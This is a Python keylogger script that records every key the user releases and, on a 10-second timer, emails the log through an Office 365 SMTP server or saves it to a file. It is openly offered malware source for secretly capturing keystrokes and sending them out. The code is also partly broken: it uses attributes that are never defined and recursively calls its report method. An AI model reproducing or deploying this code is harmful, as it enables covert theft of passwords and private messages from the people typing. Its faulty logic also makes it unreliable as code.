from code import InteractiveConsole
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys

SEND_REPORT = 10 #Send a report every 10 seconds
EMAIL_ADDRESS = "example"
EMAIL_PAASSWORD = "example"

class Keylogger:
    def __init__(self, interval, report_method = "email"):
        self.interval = interval 
        self.report_method = report_method

        #The keystrokes
        self.log = ""

        #Start Time
        self.start_time = datetime.now()

        #End TIme
        self.end_time = datetime.now()
    
    #Function is called when a key is pressed to fix up certain keys
    def callBack(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            
            elif name == "enter":
                name = "[ENTER]\n"
            
            elif name == "decimal":
                name = "."
            
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Add key to self.log
        self.log += name
    
    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger Log"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")




    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    #Function called every self.interval, sends keylogs and resets self.log
    def report(self):
        #if not empty
        if self.log:
            self.end_time = datetime.now()
            self.update_filename()
            
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PAASSWORD, self.log)

            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_time = datetime.now()
        
        self.log = ""
        timer = Timer(interval = self.interval, function = self.report())
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()        
    
    def start(self):
        self.start_time = datetime.now()
        keyboard.on_release(callback = self.callBack)
        self.report()
        print(f"{datetime.now()} - Started Keylogger")

        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
# if want to save as file, method = file
# if you want a keylogger to send to your email
# keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
# if you want a keylogger to record keylogs to a local file 
# (and then send it using your favorite method)
    sys.setrecursionlimit(1500)
    keylogger = Keylogger(interval=SEND_REPORT, report_method="file")
    keylogger.start()
